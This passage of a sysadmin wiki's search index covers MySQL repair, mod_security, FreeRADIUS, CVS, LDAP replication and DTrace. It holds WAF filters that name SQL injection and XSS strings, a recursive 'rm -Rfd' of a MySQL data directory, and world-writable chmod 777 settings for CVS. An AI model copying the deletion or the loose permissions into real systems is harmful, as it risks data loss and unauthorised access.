                href: "\/R%C3%A9parer_des_bases_MyISAM_et_InnoDB\/",
                title: "Repairing MyISAM and InnoDB Databases",
                description: "A comprehensive guide on how to repair and fix corrupted MyISAM and InnoDB databases in MySQL, with solutions for common database issues.",
                content: "Introduction linkSo… your shiny MySQL database is no longer running and you want to fix it?\nYou’ve come to the right place!\nI’ve assembled a list of 7 ways to fix your MySQL database when a simple restart doesn’t do the trick, or when you have corrupt tables.\nSimple MySQL restart:\n/usr/local/mysql/bin/mysqladmin -uUSERNAME -pPASSWORD shutdown /usr/local/mysql/bin/mysqld_safe \u0026 Solutions linkCorrupt MyISAM tables linkMySQL database allows you to define a different MySQL storage engine for different tables. The storage engine is the engine used to store and retrieve data. Most popular storage engines are MyISAM and InnoDB.\nMyISAM tables -will- get corrupted eventually. This is a fact of life.\nLuckily, in most cases, MyISAM table corruption is easy to fix.\nTo fix a single table, connect to your MySQL database and issue a:\nrepair TABLENAME To fix everything, go with:\n/usr/local/mysql/bin/mysqlcheck --all-databases -uUSERNAME -pPASSWORD -r A lot of times, MyISAM tables will get corrupt and you won’t even know about it unless you review the log files.\nI highly suggest you add this line to your /etc/my.cnf config file. It will automatically fix MyISAM tables as soon as they become corrupt:\n... [mysqld] myisam-recover=backup,force ... If this doesn’t help, there are a few additional tricks you can try.\nMultiple instances of MySQL linkThis is pretty common. You restart MySQL and the process immediately dies.\nReviewing the log files will tell you another instance of MySQL may be running.\nTo stop all instances of MySQL:\n/usr/local/mysql/bin/mysqladmin -uUSERNAME -pPASSWORD shutdown killall mysql killall mysqld Now you can restart the database and you will have a single running instance\nChanged InnoDB log settings linkOnce you have a running InnoDB MySQL database, you should never ever change these lines in your /etc/my.cnf file:\ndatadir = /usr/local/mysql/data innodb_data_home_dir = /usr/local/mysql/data innodb_data_file_path = ibdata1:10M:autoextend innodb_log_group_home_dir = /usr/local/mysql/data innodb_log_files_in_group = 2 innodb_log_file_size = 5242880 InnoDB log file size cannot be changed once it has been established. If you change it, the database will refuse to start.\nDisappearing MySQL host tables linkI’ve seen this happen a few times. Probably some kind of freakish MyISAM bug.\nEasily fixed with:\n/usr/local/bin/mysql_install_db MyISAM bad auto_increment linkIf the auto_increment count goes haywire on a MyISAM table, you will no longer be able to INSERT new records into that table.\nYou can typically tell the auto_increment counter is malfunctioning, by seeing an auto_increment of -1 assigned to the last inserted record.\nTo fix - find the last valid auto_increment id by issuing something like:\nSELECT max(id) from tablename And then update the auto_increment counter for that table\nALTER TABLE tablename AUTO_INCREMENT = id+1 Too many connections linkYour database is getting hit with more connections than it can handle and now you cannot even connect to the database yourself.\nFirst, stop the database:\n/usr/local/mysql/bin/mysqladmin -uUSERNAME -pPASSWORD shutdown If that doesn’t help you can try “killall mysql” and “killall mysqld”\nOnce the database stopped, edit your /etc/my.cnf file and increase the number of connections. Don’t go crazy with this number or you’ll bring your entire machine down.\nOn a dedicated database machine we typically use:\nmax_connections = 200 wait_timeout = 100 Try restarting the database and see if that helps.\nIf you’re getting bombarded with queries and you need to be able to connect to the database to make some table changes, set a different port number in your /etc/my.cnf file, start the database, make any changes, then update the port back to normal (master-port = 3306) and restart.\nCorrupt InnoDB tables linkInnoDB tables are my favorite. Transactional, reliable and unlike MyISAM, InnoDB supports concurrent writes into the same table.\nInnoDB’s internal recovery mechanism is pretty good. If the database crashes, InnoDB will attempt to fix everything by running the log file from the last timestamp. In most cases it will succeed and the entire process is transparent.\nUnfortunately if InnoDB fails to repair itself, the -entire- database will not start. MySQL will exit with an error message and your entire database will be offline. You can try to restart the database again and again, but if the repair process fails - the database will refuse to start.\nThis is one reason why you should always run a master/master setup when using InnoDB - have a redundant master if one fails to start.\nBefore you go any further, review MySQL log file and confirm the database is not starting due to InnoDB corruption.\nThere are tricks to update InnoDB’s internal log counter so that it skips the queries causing the crash, but in our experience this is not a good idea. You lose data consistency and will often break replication.\nOnce you have corrupt InnoDB tables that are preventing your database from starting, you should follow this five step process:\nAdd this line to your /etc/my.cnf configuration file: ... [mysqld] innodb_force_recovery = 4 ... Restart MySQL. Your database will now start, but with innodb_force_recovery, all INSERTs and UPDATEs will be ignored. Dump all tables Shutdown database and delete the data directory. Run mysql_install_db to create MySQL default tables Remove the innodb_force_recovery line from your /etc/my.cnf file and restart the database. (It should start normally now) Restore everything from your backup InnoDB Corruption linkRecently I was faced with the daunting task of reparing an InnoDB database gone bad. The database would not start due to corruption.\nFirst step was turning-on InnoDB force-recovery mode, where InnoDB starts but ignores all UPDATEs and INSERTs.\nAdd this line to /etc/my.cnf:\ninnodb_force_recovery = 2 Now we can restart the database:\n/usr/local/bin/mysqld_safe \u0026 (Note: If MySQL doesn’t restart, keep increasing the innodb_force_recovery number until you get to innodb_force_recovery = 8)\nSave all data into a temporary alldb.sql (this next command can take a while to finish):\nmysqldump --force --compress --triggers --routines --create-options -uUSERNAME -pPASSWORD --all-databases \u003e /usr/alldb.sql Shutdown the database again:\nmysqladmin -uUSERNAME -pPASSWORD shutdown Delete the database directory. (Note: In my case the data was under /usr/local/var. Your setup may be different. Make sure you’re deleting the correct directory)\nrm -Rfd /usr/local/var Recreate the database directory and install MySQL basic tables\nmkdir /usr/local/var chown -R mysql:mysql /usr/local/var /usr/local/bin/mysql_install_db chown -R mysql:mysql /usr/local/var Remove innodb_force_recovery from /etc/my.cnf and restart database:\n/usr/local/bin/mysqld_safe \u0026 Import all the data back (this next command can take a while to finish):\nmysql -uroot --compress \u003c /usr/alldb.sql And finally - flush MySQL privileges (because we’re also updating the MySQL table)\n/usr/local/bin/mysqladmin -uroot flush-privileges Note: For best results, add port=8819 (or any other random number) to /etc/my.cnf before restarting MySQL and then add –port=8819 to the mysqldump command. This way you avoid the MySQL database getting hit with queries while the repair is in progress.\nResources linkhttp://www.softwareprojects.com/resources/programming/t-how-to-fix-mysql-database-myisam-innodb-1634.html\n"
            }
        );
    index.add(
            {
                id:  568 ,
                href: "\/Cr%C3%A9er_un_Apple_Time_Machine_r%C3%A9seaux_sous_FreeBSD\/",
                title: "Creating an Apple Time Machine Network on FreeBSD",
                description: "How to set up a FreeBSD server as a Time Machine network backup destination for Mac OS X.",
                content: "Introduction linkHere’s a quick guide on how to set up Time Machine on Mac OS X to back up to a networked machine running FreeBSD.\nOn the FreeBSD server link Build \u0026 Install net/netatalk from ports. Edit /usr/local/etc/AppleVolumes.default Append: “/your_time_machine_path TimeMachine allow:your_user_name cnidscheme:cdb options:usedots” and replace your path and your username in the proper places. Optionally, remove the “~” already present in that file if you don’t want to share users home directories. Add “netatalk_enable=“YES”” and “afpd_enable=“YES”” to /etc/rc.conf. /usr/local/etc/rc.d/netatalk start (nothing will be printed). Mac OS X machine client (running Leopard, of course) link Mount your remote volume. Command+K on the Finder and then type: “afp://”. You can’t type the machine name because we’re not using multicast DNS. Build a sparse bundle image using “Disk utility” (HFS+ case-sensitive formatted). Usually, the size should be something that gives you enough room for expansion. If you want to backup your whole MacBook/iMac/etc. disk, you can set the sparse bundle image size the same as the disk your are backing up. The name of this image is important. It should be “Your_Computer_Name_MACAddress.sparsebundle”. Check your computer name from the “Sharing” section of “System Preferences” and the MAC address comes from the interface you’ll be using to do the backup. I really recommend using your Wired interface. Check the MAC address via ifconfig(1) or via the “Network” section of “System Preferences”. E.g., if you’re John Doe, have a MacBook and your MAC address is 00:01:02:03:04:05, your file should be named “John Doe’s MacBook_000102030405.sparsebundle”. On the Terminal, type “defaults write com.apple.systempreferences TMShowUnsupportedNetworkVolumes 1”. This is the crucial thing. Go to “System Preferences”, “Time Machine” and enable it. The networked volume will now show up on the list. Before selecting the volume on which you’ll dump the backup, copy the sparse bundle file you’ve created to your networked volume called “TimeMachine”. Select the networked Volume from the Time Machine volumes list. Initiate the backup! Enjoy!\nAs Remko points out in the comments, the MAC address is not restrictive. So, if you want to backup via wired interface and after that via wireless, Time Machine will work using both interfaces. I suppose that Time Machine inspects all MAC addresses in your machine and then searches a sparse bundle in the networked volume that matches.\nResources linkhttps://blogs.freebsdish.org/rpaulo/2008/10/04/apple-time-machine-freebsd-in-14-steps/\n"
            }
        );
    index.add(
            {
                id:  569 ,
                href: "\/S%C3%A9curiser_Apache_avec_mod_security\/",
                title: "Securing Apache with mod_security",
                description: "Learn how to increase Apache security with mod_security module, a web application firewall to protect against SQL injection, XSS and other common attacks.",
                content: "Introduction linkThis is what I’ve been looking for quite some time! A module specifically designed for Apache security.\nThis module increases the security level of an Apache web server or other servers if used with Apache in proxy mode. Modsecurity acts as an application firewall embedded in Apache. It protects web applications against common attacks (SQL injection, Cross Site Scripting, etc.)\nI found this nice documentation, but like most docs, it’s missing some things. It’s not much but I’m adding it anyway.\nInstallation linkIf your Debian distribution doesn’t have the packages, download them from the Debian website then:\ndpkg -i libapache2-mod-security* mod-security-common* Then create a symbolic link to activate the module:\nln -s /etc/apache2/mods-available/mod-security.load /etc/apache2/mods-enabled/ Then restart to load everything:\n/etc/init.d/apache2 restart Configuration linkAll you need to do is read Mod security.pdf.\nAnd finally, here’s my configuration:\n# Security discoverd with Nikto TraceEnable \"off\" # More Security # Turn the filtering engine On or Off SecFilterEngine On # Server Signature SecServerSignature \"Microsoft-IIS/5.0\" # Make sure that URL encoding is valid SecFilterCheckURLEncoding On # Unicode encoding check SecFilterCheckUnicodeEncoding Off # Only allow bytes from this range SecFilterForceByteRange 0 255 # Only log suspicious requests SecAuditEngine RelevantOnly # The name of the audit log file SecAuditLog /var/log/apache2/audit_log # Debug level set to a minimum SecFilterDebugLog /var/log/apache2/modsec_debug_log SecFilterDebugLevel 0 # Should mod_security inspect POST payloads SecFilterScanPOST On # By default log and deny suspicious requests # with HTTP status 500 SecFilterDefaultAction \"deny,log,status:500\" # Require HTTP_USER_AGENT and HTTP_HOST in all requests SecFilterSelective \"HTTP_USER_AGENT|HTTP_HOST\" \"^$\" # Weaker XSS protection but allows common HTML tags SecFilter \"\u003c[[:space:]]*script\" # Prevent XSS atacks (HTML/Javascript injection) #SecFilter \"\u003c(.|n)+\u003e\" # Very crude filters to prevent SQL injection attacks SecFilter \"delete[[:space:]]+from\" SecFilter \"insert[[:space:]]+into\" # Replace \"elect\" with \"select\" in the line below SecFilter \"elect.+from\" SecFilter \"drop[[:space:]]table\" # Protecting from XSS attacks through the PHP session cookie SecFilterSelective ARG_PHPSESSID \"!^[0-9a-z]*$\" SecFilterSelective COOKIE_PHPSESSID \"!^[0-9a-z]*$\" Resources linkMod Security Debian Etch Documentation\nAdvanced Apache web server security: mod_security and mod_dosevasive\n"
            }
        );
    index.add(
            {
                id:  570 ,
                href: "\/BusyBox_:_Cr%C3%A9ation_et_utilisation_d%27une_BusyBox\/",
                title: "BusyBox: Creation and Usage of a BusyBox",
                description: "Learn how to create and use BusyBox, a software that implements numerous standard Unix commands in a single executable file, making it ideal for embedded Linux systems.",
                content: "Introduction linkBusyBox is a software that implements a large number of standard Unix commands, similar to GNU Core Utilities. BusyBox is designed as a single executable file, making it very suitable for Linux distributions used on embedded systems. Since each binary executable file for Linux contains several kilobytes of additional information, the idea of combining more than two hundred programs into a single executable file allows for considerable space savings.\nDistributed under the GNU GPL version 2 license, BusyBox is free software.\nAt the end of 2007, BusyBox attracted attention for its legal efforts to pursue and enforce its rights against certain companies that would use it in violation of the terms of the GPL license.\nIndeed, this system remains one of the most widespread on network devices. It can be found, for example, on access points, routers, or even on some NAS (Network Attached Storage). Generally, you can access this device via telnet, which allows more freedom and creativity for its configuration.\nImplementation linkLinux embedded: BusyBox “in a nutshell”\n"
            }
        );
    index.add(
            {
                id:  571 ,
                href: "\/Guide_de_configuration_d%27OpenBSD_%5C%28Tr%C3%A8s_complet%5C%29\/",
                title: "OpenBSD Configuration Guide (Very Complete)",
                description: "A comprehensive guide for configuring OpenBSD systems, including PF, OpenNTPD and other components.",
                content: "Here is a fairly complete documentation on setting up PF, OpenNTPD, and more:\nOpenBSD Configuration Guide\n"
            }
        );
    index.add(
            {
                id:  572 ,
                href: "\/Mise_en_place_d\u0027un_serveur_FreeRadius\/",
                title: "Setting up a FreeRadius server",
                description: "This guide explains how to install and configure a FreeRadius server on OpenBSD, including basic user setup and verification.",
                content: "Introduction linkFreeRADIUS is an open-source RADIUS server.\nIt offers an alternative to other enterprise RADIUS servers, and is one of the most modular and feature-rich RADIUS servers available today. It is considered the most widely used server in the world.\nIt is suitable for both embedded systems with limited memory and systems with several million users.\nI installed this server on OpenBSD to connect a WiFi access point to it. This is quite practical and currently the most secure approach.\nInstallation linkOn OpenBSD:\npkg_add -iv freeradius Now we need to add it to the boot process:\nif [ -x /usr/local/sbin/radiusd ]; then install -d -o _freeradius /var/run/radiusd echo -n ' radiusd'; /usr/local/sbin/radiusd fi If you want a configuration file example, look at /usr/local/share/examples/freeradius.\nConfiguration linkclient.conf linkWe will edit the client.conf file to add a test user:\nclient 127.0.0.1 { secret = testing123 shortname = localhost } users linkLet’s add a simple user for now:\n\"deimos\" Cleartext-Password := \"password\" Verification linkTo verify that the user is working properly, you can use the radtest command:\nradtest deimos test 127.0.0.1 1812 testing123 deimos : the user password : the password 127.0.0.1 : the Radius server 1812 : the Radius server port testing123: the additional password "
            }
        );
    index.add(
            {
                id:  573 ,
                href: "\/OpenSSH_:_Export_de_fen%C3%AAtre_graphiques\/",
                title: "OpenSSH: Graphical Window Forwarding",
                description: "How to export X windows using OpenSSH tunneling for accessing graphical applications on remote machines securely",
                content: "Introduction linkOpenSSH is capable of exporting X windows from another machine (creating an SSH tunnel). For example, you can connect to a server that has X and you only have SSH access to the remote machine.\nIn your SSH configuration file (/etc/ssh/sshd_config), set this to yes:\nX11Forwarding yes Launching the Session linkHere’s an example session. Here we’ll export VNC which is running on the direct machine:\n/usr/bin/ssh -gL5901:127.0.0.1:5901 -C xxx@mycompany.com This will export the remote port 5901 to the local machine’s port 5901.\nIf we need to go through an SSH gateway first:\n/usr/bin/ssh gateway_machine -L 5901:machine_on_my_network:5901 It’s also possible to automate an SSH tunnel by adding a line like this in the SSH configuration file (~/.ssh/config):\nLocalForward : Here’s an example:\nHost mycompany.com User username // To use a different username than the current one LocalForward 993 localhost:993 // To access my own IMAPS server LocalForward 119 news.free.fr:119 // To access the free news server Connecting to the Remote Session linkLaunch vncviewer and connect to “localhost:1”. You will then see the remote server screen.\nConclusion linkSSH is capable of forwarding any window and any port. For security reasons, it’s preferable to open as few ports as possible. Just open SSH to pass these types of services.\nResources linkDocumentation on Best Practices on SSH\nPrinciples and Usage of SSH\n"
            }
        );
    index.add(
            {
                id:  574 ,
                href: "\/MFS_:_Utiliser_un_filesystem_en_RAM\/",
                title: "MFS: Using a RAM Filesystem",
                description: "A guide on how to use MFS (Memory FileSystem) to improve performance by creating partitions in RAM",
                content: "Introduction linkMFS allows you to place a partition in RAM. The advantage is speed. The disadvantage is that you lose all modifications made to it after each reboot. With a simple rsync setup, this can be resolved, which I’ll show you how to do.\nConfiguration linkPartition /tmp linkThe tmp directory is interesting to move into RAM since the data there is temporary anyway and doesn’t need to be stored on the filesystem. Edit the fstab file:\n... swap /tmp mfs rw,nodev,nosuid,-s=32768 0 0 Nothing more needs to be done :-)\nPartition /var linkAfter installing the necessary packages (such as net-snmp, pftop, pfstat, screen…), configuring the crontab, and configuring chrooted services like bind or an Apache reverse proxy, we can begin setting up the /var partition in MFS by copying its content to the partition reserved for this purpose.\nNote that from now on, all modifications to /var should be made from /mfs/var:\nfind /var | cpio -dumpv /mfs/ Now let’s edit the fstab:\nswap /var mfs rw,-P=/mfs/var,nodev,nosuid,-s=64000 0 0 Syncronisation of modifications linkWe’ll use rsync to update the data. Since we don’t need to have everything in real time, a weekly update can be sufficient. Install rsync:\npkg_add -iv rsync Add this line to the root crontab:\n3 0 * * */1 /usr/local/bin/rsync -az --delete /var/ /mfs/var/ And finally for machine shutdown:\n/usr/local/bin/rsync -vaz --delete /var/ /mfs/var/ References link http://www.openbsd.org/cgi-bin/man.cgi?query=mfs http://wiki.gcu.info/doku.php?id=openbsd:install_soekris https://alpage.org/wiki/doc/openbsd/root_ro http://blog.spoofed.org/2007/12/openbsd-on-soekris-cheaters-guide.html "
            }
        );
    index.add(
            {
                id:  575 ,
                href: "\/OCS_Inventory_:_Mise_en_place_d\u0027un_inventaire_de_parc_automatique\/",
                title: "OCS Inventory: Setting up Automatic Network Inventory",
                description: "How to set up OCS Inventory for automatic network inventory management with client installation on Debian and Windows platforms",
                content: "Introduction linkOpen Computer and Software Inventory Next Generation is an application designed to help system or network administrators keep track of the network machines’ configuration and the software installed on them.\nOCS Inventory is also able to detect any active device on the network, such as switches, routers, printers, and other unexpected hardware. For each one, it stores MAC and IP addresses and allows you to classify them.\nIf the administration server runs on Linux, and if nmap and smblookup are available, you also have the option to scan an IP or a subnet for detailed information about uninventoried hosts.\nLast but not least, OCS Inventory NG integrates package deployment features on client machines. From the administration console, you can upload packages (software installations, commands, or just files to store on client computers) that will be downloaded via HTTP/HTTPS and executed by agents on clients.\nHere’s a setup document:\nOCS Inventory Setup\nClient Installation linkDebian linkFor Debian, here’s what you need to do to make it work. Extract the archive:\ntar -xzvf OCSNG_LINUX_AGENT_1.01_with_require.tar.gz Then install the perl modules via cpan:\ncpan install XML::Simple install Compress::Zlib install Net::IP install LWP quit Then the others via apt:\napt-get install libmd5-perl libnet-ssleay-perl sh setup.sh Windows linkFor your domain, here is a small script that can be executed at user logon:\n@echo off \"\\\\mon_serveur_de_domaine\\netlogon\\192.168.0.16.exe\" /DEBUG /NP /INSTALL c: cd \"%ProgramFiles%\\OCS Inventory Agent\" OCSInventory /SERVER:192.168.0.16 /TAG:\"%username%\" Here 192.168.0.16 corresponds to my OCS server.\nResources linkOCS Inventory Setup with GLPI\n"
            }
        );
    index.add(
            {
                id:  576 ,
                href: "\/Mise_en_place_dun_Watchdog\/",
                title: "Setting up a Watchdog",
                description: "Instructions for setting up and configuring a Watchdog on a system to ensure automatic restart when the system becomes unresponsive.",
                content: "Introduction linkA watchdog is an electronic circuit or software used in digital electronics to ensure that an automated system or computer does not remain stuck at a particular step of its processing. It’s a protection measure generally intended to restart the system if a defined action is not executed within a specified time.\nIn industrial computing, the watchdog is often implemented through an electronic device, generally a monostable flip-flop. It works on the principle that each step of the processing must execute within a maximum time. At each step, the system arms a timer before execution. If the flip-flop returns to its stable state before the task is completed, the watchdog triggers. It implements a backup system that can either trigger an alarm, restart the automaton, or activate a redundant system. Watchdogs are often integrated into microcontrollers and motherboards dedicated to real-time processing.\nWhen implemented in software, it generally consists of a counter that is regularly reset to zero. If the counter exceeds a given value (timeout), the system performs a reset (restart). The watchdog often consists of a register that is updated via a regular interrupt. It can also consist of an interrupt routine that must perform certain maintenance tasks before returning control to the main program. If a routine enters an infinite loop, the watchdog counter will no longer be reset to zero and a reset is ordered. The watchdog also allows for a restart if no instruction is provided for this purpose. It is then sufficient to write a value exceeding the counter’s capacity directly into the register: the watchdog will initiate the reset.\nConfiguration linkConfiguration of the watchdog:\nEdit the /etc/rc.conf file and modify the following line: watchdogd_flags=NO # for normal use: \"\" to\nwatchdogd_flags=\"\" # for normal use: \"\" Reboot, a watchdogd process should be present, check the parameters: sysctl -a Modify the sysctl parameters: kern.watchdog.period=30 kern.watchdog.auto=1 "
            }
        );
    index.add(
            {
                id:  577 ,
                href: "\/Utiliser_le_pav%C3%A9_num%C3%A9rique_comme_souris_avec_X\/",
                title: "Using the Numeric Keypad as a Mouse with X",
                description: "This article explains how to use the numeric keypad to control the mouse cursor in X Window System when your mouse isn't working.",
                content: "Introduction linkIn the series “things you should know”, we have the control of the mouse pointer using the keyboard in X. If your mouse dies, it can be a real hassle - what to do? Simple, activate keyboard control.\nUsage linkTo activate:\n[CTRL]+[SHIFT]+[NUMLOCK] The pointer can then be moved using the numeric keypad keys.\nClick with [0] and [+] Return to normal operation with [CTRL]+[SHIFT]+[NUMLOCK]. Small beeps indicate the operation worked correctly. You can also use [5] to accelerate the movement. "
            }
        );
    index.add(
            {
                id:  578 ,
                href: "\/analyser-les-configs-des-equipements-et-des-reseaux\/",
                title: "Analyzing Network Equipment and Network Configurations",
                description: "Documentation on analyzing configurations of network equipment and networks",
                content: "Analyzing Network Equipment and Network Configurations\n"
            }
        );
    index.add(
            {
                id:  579 ,
                href: "\/Gestion_des_process_zombies_sous_Linux\/",
                title: "Managing Zombie Processes in Linux",
                description: "Information about killing zombie processes in Linux with the TASK_KILLABLE state introduced in kernel 2.6.26.",
                content: "Since Linux Kernel version 2.6.26, there is FINALLY the possibility to kill Zombie processes:\nTASK_KILLABLE: New process state in Linux\n"
            }
        );
    index.add(
            {
                id:  580 ,
                href: "\/Installation_et_configuration_de_CVS\/",
                title: "CVS Installation and Configuration",
                description: "How to install and configure CVS on Debian and Red Hat Linux distributions.",
                content: "Installation linkDebian link apt-get install cvs xinetd Red Hat link up2date cvs Creating Admin Group and Directories link adduser cvsadmin mkdir -p /home/cvsadmin/repository mkdir /home/cvsadmin/.lock chown -Rf :cvsadmin /home/cvsadmin chmod -Rf 775 /home/cvsadmin chmod -Rf 777 /home/cvsadmin/.lock ln -s /home/cvsadmin/repository /usr/local/cvsroot Repository Initialization link export CVSROOT=/usr/local/cvsroot cvs -d $CVSROOT init chown -Rf root:cvsadmin /home/cvsadmin/repository/* \u0026\u0026 chmod -Rf 777 /home/cvsadmin/repository/* Activating Lock Files linkTo ensure that lock files are stored in a directory writable by all, you need to modify the /usr/local/cvsroot-backup/CVSROOT/config file as follows:\n# Put CVS lock files in this directory rather than directly in the repository. LockDir=/home/cvsadmin/.lock Xinetd Configuration linkAdd a file \"/etc/xinetd.d/cvspserver\" for the CVS PServer in the directory:\nservice cvspserver { port = 2401 socket_type = stream protocol = tcp user = root wait = no disable = no type = UNLISTED # Debian server = /usr/bin/cvs # RedHat # server = /usr/local/bin/cvs server_args = -f --allow-root /usr/local/cvsroot pserver } User Management linkEach user must have their own home directory and be the owner of it. By default, all users will have the ability to commit and write in each module (directories at the root of the repository) but not to create new modules. To allow a user to write inside the repository (create/delete modules, etc.), simply add them to the “cvsadmin” group by modifying the /etc/group file as follows:\ncvsadmin:x:509:username "
            }
        );
    index.add(
            {
                id:  581 ,
                href: "\/LDAP_:_Installation_et_configuration_d\u0027un_Annuaire_LDAP_(secondaire)\/",
                title: "LDAP: Installation and Configuration of a Secondary LDAP Directory",
                description: "Guide on how to configure OpenLDAP for LDAP tree replication between 2 servers using slapd and slurpd.",
                content: "Introduction linkThis document explains how to configure OpenLDAP for LDAP tree replication between 2 servers.\nFor this, we will use slapd and slurpd from the OpenLDAP suite.\nThis applies to both Linux distributions, tested on Debian Sarge, and FreeBSD, tested on 6.1.\nPrerequisites linkYou will need to configure the slapd daemons on both servers. For this, you can follow this document: Standard SLAPD Configuration\nThe Master Server linkOn the master server, we will create a dedicated user for replication who will only have read rights but will be able to read the entire tree.\nTo do this, we modify the slapd.conf file to add the line for the user “cn=replication,o=deimos,dc=fr”:\n## Acces Lists # Admin can change all, watcher and all authentified users can read all access to * by dn.regex=\"cn=manager,o=deimos,dc=fr\" write by dn.regex=\"cn=watcher,o=deimos,dc=fr\" read by dn.regex=\"cn=replication,o=deimos,dc=fr\" read by * auth Its LDIF file will be of the form:\n# replication, deimos, net dn: cn=replication,o=deimos,dc=fr objectClass: top objectClass: person userPassword: {SSHA}hSixML09eyZsQncyqSebQq5tFpXgXT63 cn: replication sn: LDAP replication user To add it to our tree, you can use client tools.\nOnce this is done, we need to explain to the master server who the slave servers are and how to update them.\nFor this, we will add some directives to the slapd.conf configuration file:\n# Réplication # Comment joindre le serveur esclave replica # L'url pour le serveur esclave uri=ldaps://ldap2.deimos.fr # Le DN distant que l'on utilise pour mettre à jour l'arbre distant binddn=\"cn=replication,o=deimos,dc=fr\" # La méthode d'authentification et le mot de passe associé en clair !! bindmethod=simple credentials= # le fichier de log de la réplication replogfile /var/db/openldap-slurp/replica/replog Be careful with permissions on the /var/db/openldap-slurpd/ directory!\nThe slurpd daemon must be started automatically when the server starts. There is no specific configuration other than what we added to the slapd.conf file.\nOur master server is now properly configured.\nThe Slave Server linkOn the slave server, not many changes need to be made to the SLAPD configuration. The main thing is that the user “cn=replication,o=deimos,dc=fr” must have write permissions to update the tree!\nThen we will also need to define who the master server is.\nFor this, we modify the slapd.conf file to add the line for the user “cn=replication,o=deimos,dc=fr”:\n## Acces Lists # Admin can change all, watcher and all authentified users can read all access to * by dn.regex=\"cn=manager,o=deimos,dc=fr\" write by dn.regex=\"cn=watcher,o=deimos,dc=fr\" read by dn.regex=\"cn=replication,o=deimos,dc=fr\" write by * auth We also modify the file to declare the master server:\n# Réplication # l'utilisateur qui met à jour l'arbre updatedn \"cn=replication,o=deimos,dc=fr\" # L'URL du serveur maître updateref \"ldaps://openldap.deimos.fr\" Our slave server is now configured.\nImplementation linkTo put our servers into service, there are a few simple steps:\nStop the slapd daemon on both servers: /usr/local/etc/rc.d/slapd stop Copy the contents of the /var/db/openldap-slapd/ directory from the master server to the /var/db/openldap-slapd/ directory on the slave server Start the slapd daemon on the master server: /usr/local/etc/rc.d/slapd start Start the slurpd daemon on the master server: /usr/local/etc/rc.d/slurpd start Start the slapd daemon on the slave server: /usr/local/etc/rc.d/slapd start Our tree is now synchronized between the two servers.\nFinal Remarks linkModifications are only possible on the master server. If we try to make modifications on a slave server, even with a DN that has write permissions, we get an error message indicating the URL of the master server.\nAll modifications made on the master server are replicated “instantly” to the slave servers, depending on the server loads of course!\nFor additions and modifications, they are done exactly as if the master server was autonomous. For read access, it can be done on all servers.\nResources linkhttp://www.free-4ever.net/index.php/Openldap:configuration_slapd_replication\nSetting up a multimaster OpenLDAP\n"
            }
        );
    index.add(
            {
                id:  582 ,
                href: "\/DTrace_:_d%C3%A9tection_de_probl%C3%A8mes_en_temps_r%C3%A9el\/",
                title: "DTrace: Real-time Problem Detection",
                description: "This article covers DTrace, a powerful tracing system designed for real-time problem detection at kernel or application level, with practical examples and scripts.",
                content: "Introduction linkDTrace is a tracing system designed by Sun Microsystems for real-time problem detection at both kernel and application levels. It has been available since November 2003 and was integrated as part of Solaris 10 in January 2005. DTrace is the first component of the OpenSolaris project whose code was released under the Common Development and Distribution License (CDDL).\nDTrace is designed to provide information that allows users to tune applications and the operating system itself. It’s built to be used in production environments. The impact of the probes is minimal when tracing is active, and there’s no performance impact for inactive probes. This is important because a system includes tens of thousands of probes, many of which can be active.\nTracing programs (often called scripts) are written using the D programming language (not to be confused with D). D is a subset of the C language with additional functions and predefined variables specific to tracing operations. A program written in D structurally resembles a program written in AWK.\nSince it can be time-consuming to create your own scripts each time, I’ve included here all the ones I’ve used.\nPrint Utilization Statistics per Process linkBrendan Gregg developed prustat to display the top processes sorted by CPU, Memory, Disk or Network utilization:\n$ prustat -c -t 10 5 PID %CPU %Mem %Disk %Net COMM 7176 0.88 0.70 0.00 0.00 dtrace 7141 0.00 0.43 0.00 0.00 sshd 7144 0.11 0.24 0.00 0.00 sshd 3 0.34 0.00 0.00 0.00 fsflush 7153 0.03 0.19 0.00 0.00 bash 99 0.00 0.22 0.00 0.00 nscd 7146 0.00 0.19 0.00 0.00 bash 52 0.00 0.17 0.00 0.00 vxconfigd 7175 0.07 0.09 0.00 0.00 sh 98 0.00 0.16 0.00 0.00 kcfd This script is super useful for getting a high-level understanding of what is happening on a Solaris server. Golden!\nFile System Flush Activity linkOn Solaris systems, the pagedaemon is responsible for scanning the page cache and adjusting the MMU reference bit of each dirty page it finds. When the fsflush daemon runs, it scans the page cache looking for pages with the MMU reference bit set, and schedules these pages to be written to disk. The fsflush.d D script provides a detailed breakdown of pages scanned, and the number of nanoseconds that were required to scan “SCANNED” pages:\n$ fsflush.d SCANNED EXAMINED LOCKED MODIFIED COALESCE RELEASES TIME(ns) 4254 4255 1 1 0 0 2695024 4254 4255 1 0 0 0 1921518 4254 4255 6 0 0 0 1989044 4254 4255 1 0 0 0 2401266 4254 4255 4 1 0 0 2562138 4254 4255 89 4 0 0 2425988 4254 3744 80 25 0 0 2394895 4254 4255 28 8 0 0 1776222 4254 4255 216 8 0 0 2350826 4254 4255 108 7 0 0 2356146 Now you might be wondering why “SCANNED” is less than “EXAMINED?” This is due to a bug in fsflush, and a bug report was filed to address this anomaly. Tight!\nSeek Sizes linkPrior to Solaris 10, determining if an application accessed data in a sequential or random pattern required reviewing mounds of truss(1m) and vxtrace(1m) data. With the introduction of DTrace and Brendan Gregg’s seeksize.d D script, this question is trivial to answer:\n$ seeksize.d Sampling... Hit Ctrl-C to end. ^C PID CMD 7312 dd if=/dev/dsk/c1t1d0s2 of=/dev/null bs=1048576 value ------------- Distribution ------------- count -1 | 0 0 |@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 1762 1 | 0 0 sched value ------------- Distribution ------------- count -1048576 | 0 -524288 |@@@@ 1 -262144 | 0 -131072 | 0 -65536 | 0 -32768 | 0 -16384 | 0 -8192 | 0 -4096 | 0 -2048 | 0 -1024 | 0 -512 | 0 -256 | 0 -128 | 0 -64 | 0 -32 | 0 -16 | 0 -8 | 0 -4 | 0 -2 | 0 -1 | 0 0 | 0 1 | 0 2 | 0 4 | 0 8 | 0 16 | 0 32 | 0 64 | 0 128 |@@@@ 1 256 |@@@@ 1 512 |@@@@ 1 1024 |@@@@ 1 2048 | 0 4096 | 0 8192 | 0 16384 |@@@@ 1 32768 |@@@@ 1 65536 |@@@@@@@@ 2 131072 | 0 262144 | 0 524288 |@@@@ 1 1048576 | 0 This script measures the seek distance between consecutive reads and writes, and provides a histogram with the seek distances. For applications that are using sequential access patterns (e.g., dd in this case), the distribution will be small. For applications accessing data in a random nature (e.g., sched in this example), you will see a wide distribution. Shibby!\nPrint Overall Paging Activity linkPrior to the introduction of DTrace, it was difficult to extract data on which files and disk devices were active at a specific point in time. With the introduction of 